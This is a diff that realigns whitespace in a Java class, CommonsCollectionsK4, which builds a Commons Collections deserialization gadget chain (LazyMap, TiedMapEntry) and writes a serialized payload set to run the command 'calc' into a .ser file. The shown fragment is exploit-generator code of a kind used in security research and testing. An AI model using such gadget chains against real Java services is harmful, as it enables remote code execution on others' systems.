@@ -19,8 +19,8 @@ import java.util.Map;
 
 public class CommonsCollectionsK4 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous = new FileOutputStream("6666.ser");
+        byte[]           bytes = getBytes(PayloadType.command, "calc");
+        FileOutputStream fous  = new FileOutputStream("6666.ser");
         fous.write(bytes);
         fous.close();
     }
@@ -42,10 +42,10 @@ public class CommonsCollectionsK4 {
         ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});
 
         HashMap<String, String> innerMap = new HashMap<String, String>();
-        Map m = LazyMap.lazyMap(innerMap, inertChain);
+        Map                     m        = LazyMap.lazyMap(innerMap, inertChain);
 
-        Map outerMap = new HashMap();
-        TiedMapEntry tied = new TiedMapEntry(m, "v");
+        Map          outerMap = new HashMap();
+        TiedMapEntry tied     = new TiedMapEntry(m, "v");
         outerMap.put(tied, "t");
         innerMap.clear();
 
@@ -53,7 +53,7 @@ public class CommonsCollectionsK4 {
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(outerMap);
         byte[] bytes = baous.toByteArray();
         oos.close();
